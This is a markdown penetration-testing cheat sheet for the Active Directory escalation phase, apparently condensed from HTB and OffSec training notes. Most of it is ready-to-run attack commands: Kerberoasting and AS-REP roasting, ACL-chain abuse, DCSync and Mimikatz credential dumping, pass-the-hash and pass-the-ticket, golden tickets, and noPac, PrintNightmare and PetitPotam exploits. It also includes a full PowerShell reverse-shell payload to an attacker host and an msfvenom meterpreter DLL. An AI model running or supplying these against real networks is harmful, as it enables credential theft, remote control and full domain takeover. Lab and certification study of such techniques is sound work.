# 4 · Escalate & attack

> **Goal:** turn credentialed access into **Domain Admin / domain compromise** — crack service
> accounts, abuse ACL chains, dump hashes, move laterally, and forge tickets. Corresponds to phase
> **4 · escalate & attack** on the journey map.
>
> Condensed from `htbad/` (17, 18, 20, 21, 22, 23, 24, 25, 26) and `offad/` (10, 17, 19–22, 24–31).
> `{{VAR}}` placeholders filled by [WorkflowHelper.html](../WorkflowHelper.html). `{{SID}}` is filled
> by hand.
>
> **Not sure which technique to reach for?** See the [triage decision tree](ad-triage-decision-tree.png)
> (in [README](README.md)) — it routes "what you have" to one of the four canonical chains.

---

## Kerberoasting (crack SPN service accounts)

> Any domain user can request a TGS for an account with an SPN; it's encrypted with that account's
> password hash → crack offline. No failed logons, no lockouts. **Only *user*-account SPNs are worth
> it** — machine/(g)MSA/krbtgt use uncrackable 120-char passwords.

### From Linux — Impacket (easy button)

```bash
impacket-GetUserSPNs -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}}                       # list SPN accounts
impacket-GetUserSPNs -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}} -request              # roast all
impacket-GetUserSPNs -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}} -request-user sqldev -outputfile sqldev_tgs
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### From Windows — Rubeus (easy button)

```powershell
.\Rubeus.exe kerberoast /stats                              # recon: count + enc types
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap  # admins first (best value)
.\Rubeus.exe kerberoast /user:{{TARGET_USER}} /nowrap
.\Rubeus.exe kerberoast /outfile:{{HASHFILE}}               # all user-SPNs → file
```

### From Windows — PowerView

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tgs.csv -NoTypeInformation
```

### RC4 vs AES — pick the right hashcat mode

```powershell
Get-DomainUser {{TARGET_USER}} -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

- **RC4** (etype 23) → `hashcat -m 13100` (fast/weak — ideal)
- **AES256** (etype 18) → `hashcat -m 19700` (much slower)

> Feeding an AES hash to 13100 just fails — always check `msds-supportedencryptiontypes` (or Rubeus
> `/stats`) first. Clock skew (`KRB_AP_ERR_SKEW`) → `sudo ntpdate {{DC_IP}}`.

### Validate the cracked password

> Confirm the recovered creds are live (and the account can reach a host) by mapping a share.
> Explicit `/user:` + password = password auth, no pre-existing ticket needed. By **hostname** it
> uses Kerberos; by **IP** it falls back to NTLM.

```cmd
net use \\{{TARGET_IP}}\c$ /user:{{DOMAIN}}\{{USERNAME}} {{PASSWORD}}
net use \\{{TARGET_IP}}\c$ /delete            :: clean up the mapping
```

> Cross-check from Linux: `nxc smb {{TARGET_IP}} -u {{USERNAME}} -p {{PASSWORD}}` (a `[+]` = valid).

<details><summary>Manual / LOLBIN method (no tools — educational)</summary>

```powershell
setspn.exe -T {{DOMAIN}} -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
.\mimikatz.exe "base64 /out:true" "kerberos::list /export" "exit"     # extract from cache
```
```bash
echo "<base64 blob>" | tr -d \\n | base64 -d > sqldev.kirbi
python2.7 kirbi2john.py sqldev.kirbi
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > tgs_hashcat
hashcat -m 13100 tgs_hashcat /usr/share/wordlists/rockyou.txt
```
</details>

---

## AS-REP Roasting (accounts with pre-auth disabled)

> Accounts with "Do not require Kerberos preauthentication" hand out an offline-crackable AS-REP.
> Works **without valid creds** from Linux (given a user list). Hashcat mode **18200**.

```bash
# Linux — Impacket (no creds needed, -no-pass + user list)
impacket-GetNPUsers {{DOMAIN_UPPER}}/ -dc-ip {{DC_IP}} -no-pass -usersfile valid_ad_users
impacket-GetNPUsers -dc-ip {{DC_IP}} -request -outputfile {{HASHFILE}} {{DOMAIN}}/{{USERNAME}}   # authenticated
hashcat -m 18200 {{HASHFILE}} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

```powershell
# Windows — Rubeus / PowerView
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol
.\Rubeus.exe asreproast /user:{{USERNAME}} /nowrap /format:hashcat
```

> **Targeted AS-REP:** with `GenericWrite`/`GenericAll` over a user, flip its UAC to disable preauth,
> roast, then **reset the UAC value**.

---

## ACL abuse (chain rights up to a privileged account)

### Enumerate abusable ACEs (PowerView)

```powershell
Import-Module .\PowerView.ps1
Find-InterestingDomainAcl                                   # quick first pass, pre-filters noise
$sid = Convert-NameToSid {{USERNAME}}
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
# object-centric (offad)
Get-ObjectAcl -Identity "{{GROUP_NAME}}" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
Convert-SidToName S-1-5-21-...-1104
```

**Rights worth chasing** (held by a *non-default* principal you control):

| Right | Over a… | What you do |
|---|---|---|
| **GenericAll** | anything | Full control — reset pw / add member / set SPN |
| **GenericWrite / WriteProperty** | user | Set an SPN → **targeted Kerberoast** |
| **WriteDACL** | object / **domain** | Grant yourself GenericAll, or **DCSync** |
| **WriteOwner** | anything | Take ownership → WriteDACL → GenericAll |
| **ForceChangePassword** | user | Reset password without the current one |
| **Self / AddMember** | group | Add yourself to the group |
| **DS-Replication-Get-Changes(-All)** | **domain** | **DCSync** → dump all hashes |
| **ReadLAPSPassword / ReadGMSAPassword** | computer / gMSA | Read the local-admin / service password cleartext |

> Hunt a **chain**, not one ACE. BloodHound automates "shortest path to Domain Admins"; PowerView is
> the manual fallback.

### Abuse the chain (example: ForceChangePassword → AddMember → GenericWrite → roast)

```powershell
# 1) build a cred object for the account you control
$SecPassword = ConvertTo-SecureString '{{PASSWORD}}' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('{{DOMAIN_NB}}\{{USERNAME}}', $SecPassword)

# 2) ForceChangePassword — reset the next user's password → you now control it
$newPw = ConvertTo-SecureString '{{PASSWORD}}!' -AsPlainText -Force
Set-DomainUserPassword -Identity {{NEXT_USER}} -AccountPassword $newPw -Credential $Cred -Verbose
$Cred2 = New-Object System.Management.Automation.PSCredential('{{DOMAIN_NB}}\{{NEXT_USER}}', $newPw)

# 3) AddMember — add controlled user into the privileged group
Add-DomainGroupMember -Identity '{{GROUP_NAME}}' -Members '{{NEXT_USER}}' -Credential $Cred2 -Verbose

# 4) GenericWrite over target — set a fake SPN, roast it, then clean up
Set-DomainObject -Credential $Cred2 -Identity {{TARGET_USER}} -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
.\Rubeus.exe kerberoast /user:{{TARGET_USER}} /nowrap
Set-DomainObject -Credential $Cred2 -Identity {{TARGET_USER}} -Clear serviceprincipalname -Verbose
Remove-DomainGroupMember -Identity "{{GROUP_NAME}}" -Members '{{NEXT_USER}}' -Credential $Cred2 -Verbose
```

Quick GenericAll on a group → add self (LOLBIN), then clean up:

```cmd
net group "{{GROUP_NAME}}" {{USERNAME}} /add /domain
net group "{{GROUP_NAME}}" {{USERNAME}} /del /domain
```

> **Always clean up** the SPNs / group memberships / UAC flags you create.

---

## DCSync (dump any/all hashes via replication)

> Needs **both** replication rights (`DS-Replication-Get-Changes` + `...-All`) on the domain object —
> held by DA/EA/DCs, or any account those were delegated to (often the payoff of an ACL chain).

```powershell
# confirm a principal holds the rights (both required)
Get-ObjectAcl "DC={{DOMAIN_NB}},DC=LOCAL" -ResolveGUIDs | ? { $_.ObjectAceType -match 'Replication-Get' } | ? {$_.SecurityIdentifier -match "{{SID}}"} | select ObjectDN,ActiveDirectoryRights,ObjectAceType
```

> **`-ResolveGUIDs` matters:** without it, `ObjectAceType` shows the raw extended-right GUID instead
> of the name — the `-match 'Replication-Get'` filter then silently matches nothing. Add the flag, or
> learn the DCSync tell — these GUIDs on the **domain object** = DCSync:
>
> | GUID | Right |
> |---|---|
> | `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | DS-Replication-Get-Changes |
> | `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | DS-Replication-Get-Changes-All |
> | `89e95b76-444d-4c62-991a-0facbeda640c` | DS-Replication-Get-Changes-In-Filtered-Set |

```bash
# Linux — Impacket (dump one user or all)
impacket-secretsdump -just-dc-user {{TARGET_USER}} {{DOMAIN}}/{{USERNAME}}:"{{PASSWORD}}"@{{DC_IP}}
impacket-secretsdump -outputfile hashes -just-dc {{DOMAIN_NB}}/{{USERNAME}}@{{DC_IP}}
hashcat -m 1000 hashes.ntds /usr/share/wordlists/rockyou.txt
```

```
:: Windows — Mimikatz
lsadump::dcsync /user:{{DOMAIN_NB}}\{{TARGET_USER}}
```

> Target `krbtgt` (→ Golden Ticket) and `Administrator` (→ PtH as DA). `runas /netonly /user:{{DOMAIN_NB}}\{{USERNAME}} powershell` to run tooling in the account's context.

### DCSync from a foothold host (pivot-free, hash-only)

> When **Kali can't route to the DC** (internal subnet) and you don't want to set up a SOCKS pivot,
> run the DCSync **on a host you already have** that *can* reach the DC — e.g. the box you RDP'd into.
> `lsadump::dcsync` only needs the **replication rights** (which `{{USERNAME}}` has), **not** local
> admin — so pick the injection method by what you hold:

```
:: have the PASSWORD → no PtH needed, just launch tooling in the account's context
runas /netonly /user:{{DOMAIN_NB}}\{{USERNAME}} powershell.exe

:: have the HASH + you ARE local admin → Mimikatz pass-the-hash (patches LSASS → needs admin)
privilege::debug
sekurlsa::pth /user:{{USERNAME}} /domain:{{DOMAIN}} /ntlm:<NT_HASH> /run:powershell.exe

:: have the HASH, NOT local admin → Rubeus overpass-the-hash (no LSASS touch, no admin)
Rubeus.exe asktgt /user:{{USERNAME}} /domain:{{DOMAIN}} /rc4:<NT_HASH> /ptt
```

Then, in the resulting `{{USERNAME}}`-context session, DCSync as normal:

```
lsadump::dcsync /domain:{{DOMAIN}} /user:{{TARGET_USER}}
```

> **First check:** if the host you're on *is* the DC, skip DCSync entirely — dump NTDS locally
> (Shadow Copy / `ntdsutil`, below). DCSync is for reaching the DC *from another host*.

---

## Credential dumping (Mimikatz / LSASS — needs local admin/SYSTEM)

> **Not admin on this box yet?** LSASS reads (and dumping *other* users' tickets below) require
> **local admin / SYSTEM** — get there first with local Windows privilege escalation:
> [`../privilege/windows.md`](../privilege/windows.md). The fastest AD-context path is usually
> [`SeImpersonatePrivilege` → Potato → SYSTEM](../privilege/windows.md#1732-using-exploits)
> (check with `whoami /priv`).

```
privilege::debug
sekurlsa::logonpasswords          # NTLM/SHA1 (+ WDigest cleartext on legacy) for all logged-on users
sekurlsa::tickets                 # TGTs + TGSs in LSASS
sekurlsa::tickets /export         # dump tickets to .kirbi files
```

WDigest downgrade — force **cleartext** into LSASS for future logons (local admin; noisy — only when
you specifically need plaintext, restore to `0` after):

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```
```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::wdigest" "exit"   # after a privileged logon
```

---

## Getting a privileged shell

```powershell
# who can RDP / WinRM where
Get-NetLocalGroupMember -ComputerName {{COMPUTER_NAME}} -GroupName "Remote Desktop Users"
Get-NetLocalGroupMember -ComputerName {{COMPUTER_NAME}} -GroupName "Remote Management Users"

# PowerShell Remoting with explicit creds
$cred = New-Object System.Management.Automation.PSCredential("{{DOMAIN_NB}}\{{USERNAME}}", (ConvertTo-SecureString "{{PASSWORD}}" -AsPlainText -Force))
Enter-PSSession -ComputerName {{COMPUTER_NAME}} -Credential $cred
```

```bash
# evil-winrm (Linux)
evil-winrm -i {{TARGET_IP}} -u {{USERNAME}} -p {{PASSWORD}}
```

MSSQL (BloodHound `SQLAdmin` edge → often code exec via `xp_cmdshell`):

```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
Get-SQLQuery -Instance "{{TARGET_IP}},1433" -query 'Select @@version'
```
```bash
impacket-mssqlclient {{DOMAIN_NB}}/{{USERNAME}}@{{TARGET_IP}} -windows-auth
```

> `xp_cmdshell` runs as the **SQL service account**, which nearly always holds
> `SeImpersonatePrivilege` → escalate that shell to SYSTEM via a Potato
> ([`../privilege/windows.md#1732-using-exploits`](../privilege/windows.md#1732-using-exploits)),
> then dump creds below.

---

## Lateral movement

> All of these need the moving user to be **local admin on the target** (except pass-the-ticket for
> your own tickets). Prep a base64 reverse-shell payload once and reuse it across WMI/WinRS/DCOM.

```python
# encode-payload.py (Kali) — outputs: powershell -nop -w hidden -e <b64>
import base64
payload = '$client = New-Object System.Net.Sockets.TCPClient("{{LHOST}}",{{LPORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
print("powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode())
```

### PsExec — interactive shell (ADMIN$ + local admin)

```powershell
.\PsExec64.exe -i \\{{COMPUTER_NAME}} -u {{DOMAIN_NB}}\{{USERNAME}} -p {{PASSWORD}} cmd
```
```bash
impacket-psexec  {{DOMAIN}}/{{USERNAME}}:'{{PASSWORD}}'@{{TARGET_IP}}
impacket-wmiexec {{DOMAIN}}/{{USERNAME}}:'{{PASSWORD}}'@{{TARGET_IP}}
```

### WMI / WinRM

```cmd
wmic /node:{{TARGET_IP}} /user:{{USERNAME}} /password:{{PASSWORD}} process call create "calc"
winrs -r:{{COMPUTER_NAME}} -u:{{USERNAME}} -p:{{PASSWORD}} "cmd /c hostname & whoami"
```
```powershell
# WMI via CIM-over-DCOM
$cred = New-Object System.Management.Automation.PSCredential('{{USERNAME}}', (ConvertTo-SecureString '{{PASSWORD}}' -AsPlaintext -Force))
$session = New-Cimsession -ComputerName {{TARGET_IP}} -Credential $cred -SessionOption (New-CimSessionOption -Protocol DCOM)
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='calc'}
```

### DCOM (MMC20.Application, TCP 135)

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","{{TARGET_IP}}"))
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <BASE64>","7")
```

### Pass-the-Hash (NTLM only)

```bash
impacket-wmiexec -hashes :{{NTLM_HASH}} Administrator@{{TARGET_IP}}
crackmapexec smb {{TARGET_IP}} -u Administrator -H {{NTLM_HASH}}
```

> Works for domain accounts + built-in local Administrator (a 2014 update blocks other local admins).

### Overpass-the-Hash (NTLM hash → Kerberos TGT)

```
sekurlsa::pth /user:{{USERNAME}} /domain:{{DOMAIN}} /ntlm:{{NTLM_HASH}} /run:powershell
```
```powershell
net use \\{{COMPUTER_NAME}}          # trigger the TGT, then klist to confirm
.\PsExec.exe \\{{COMPUTER_NAME}} cmd  # reuse via a Kerberos-only tool
```

### Pass-the-Ticket (reuse a stolen/leaked ticket — not machine-bound)

```
sekurlsa::tickets /export            # (Windows) export, pick a target .kirbi
kerberos::ptt <ticket>.kirbi         # inject into current session
```
```powershell
.\Rubeus.exe ptt /ticket:ticket.kirbi
```
```bash
# Linux — import a ccache
export KRB5CCNAME=/path/to/stolen.ccache
klist
impacket-psexec -k -no-pass {{DOMAIN}}/{{USERNAME}}@{{COMPUTER_NAME}}
impacket-ticketConverter ticket.kirbi ticket.ccache   # convert formats
# hunt for leaked tickets/keytabs
ls -la /tmp/krb5cc_* 2>/dev/null; find / -name '*.keytab' 2>/dev/null
```

---

## Ticket forging (domain persistence)

> **OSCP note:** *stealing/reusing* a leaked ticket is in scope; *forging* golden tickets is
> persistence and generally out-of-scope on the HTB exam set — offad (PEN-200) covers it, so it's
> kept here for completeness.

### Silver ticket (forge a TGS for one service — needs the SPN account's hash + domain SID)

```powershell
whoami /user                          # domain SID = the SID minus the trailing -RID
```
```
kerberos::golden /sid:{{SID}} /domain:{{DOMAIN}} /ptt /target:{{COMPUTER_NAME}}.{{DOMAIN}} /service:http /rc4:{{NTLM_HASH}} /user:{{TARGET_USER}}
```

### Golden ticket (forge any TGT — needs the krbtgt hash)

```
lsadump::lsa /patch                   # on the DC as DA: note krbtgt NTLM + Domain SID
kerberos::purge
kerberos::golden /user:{{USERNAME}} /domain:{{DOMAIN}} /sid:{{SID}} /krbtgt:{{NTLM_HASH}} /ptt
misc::cmd
```
```powershell
PsExec.exe \\{{COMPUTER_NAME}} cmd.exe   # use the DC HOSTNAME (IP forces NTLM and is blocked)
whoami /groups
```

> Since July 2022 `/user:` must be an **existing** account (PAC_REQUESTOR enforcement).

---

## NTDS.dit extraction via Shadow Copies (as DA, alt to DCSync)

```cmd
vshadow.exe -nw -p C:                  :: note the shadow device name
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
```
```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

---

## The Kerberos "double-hop" problem (classic OSCP time-sink)

> Land a WinRM/PSRemoting shell with a **password** = network logon → creds are **not delegated to a
> second hop**. Any command from that shell touching **another** machine (PowerView against the DC,
> `\\dc\share`) returns empty / Access Denied even though it works locally. Your creds aren't broken.

**Fixes:**

```powershell
# A) pass an explicit PSCredential so the second hop re-authenticates
Enter-PSSession -ComputerName {{COMPUTER_NAME}} -Credential {{DOMAIN_NB}}\{{NEXT_USER}}

# B) register a session config that runs as stored creds
Register-PSSessionConfiguration -Name {{SESSION_NAME}} -RunAsCredential {{DOMAIN_NB}}\{{NEXT_USER}}
Enter-PSSession -ComputerName {{COMPUTER_NAME}} -Credential {{DOMAIN_NB}}\{{NEXT_USER}} -ConfigurationName {{SESSION_NAME}}
```

> **Easiest on OSCP:** don't pivot *through* the WinRM shell — run the AD-querying tool **from Kali**
> with creds directly (`bloodhound-python`, impacket `user:pass`), or use `runas /netonly`.

---

## Loot & misc misconfigurations

```powershell
# passwords in description fields (classic quick win)
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
# PASSWD_NOTREQD accounts (may allow blank-password logon)
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select samaccountname,useraccountcontrol
# creds in SYSVOL logon scripts
cat \\{{COMPUTER_NAME}}\SYSVOL\{{DOMAIN_UPPER}}\scripts\reset_local_admin_pass.vbs
```

```bash
# GPP cpassword in SYSVOL (public AES key → reversible)
crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} -M gpp_autologin
gpp-decrypt "VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE"
```

---

## Bleeding-edge CVEs

```bash
# noPac (CVE-2021-42278/42287) — SAM name spoofing → impersonate DA
sudo python3 scanner.py {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}} -dc-ip {{DC_IP}} -use-ldap
sudo python3 noPac.py {{DOMAIN_UPPER}}/{{USERNAME}}:{{PASSWORD}} -dc-ip {{DC_IP}} -dc-host {{COMPUTER_NAME}} --impersonate administrator -use-ldap -dump -just-dc-user {{DOMAIN_NB}}/administrator

# PrintNightmare (CVE-2021-1675) — check then exploit
impacket-rpcdump @{{DC_IP}} | egrep 'MS-RPRN|MS-PAR'
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f dll > backupscript.dll
sudo impacket-smbserver -smb2support CompData /path/to/dll
sudo python3 CVE-2021-1675.py {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{DC_IP}} '\\{{LHOST}}\CompData\backupscript.dll'

# PetitPotam → ntlmrelayx → ADCS (ESC8) — coerce DC auth, relay to CA, get a DC cert
sudo impacket-ntlmrelayx -debug -smb2support --target http://CA01.{{DOMAIN_UPPER}}/certsrv/certfnsh.asp --adcs --template DomainController
python3 PetitPotam.py {{LHOST}} {{DC_IP}}
python3 /opt/PKINITtools/gettgtpkinit.py {{DOMAIN_UPPER}}/{{COMPUTER_NAME}}\$ -pfx-base64 <B64> dc01.ccache
export KRB5CCNAME=dc01.ccache
impacket-secretsdump -just-dc-user {{DOMAIN_NB}}/administrator -k -no-pass "{{COMPUTER_NAME}}$"@CA01.{{DOMAIN_UPPER}}
```
```powershell
# or use the DC cert with Rubeus to PTT
.\Rubeus.exe asktgt /user:{{COMPUTER_NAME}}$ /certificate:<B64> /ptt
```
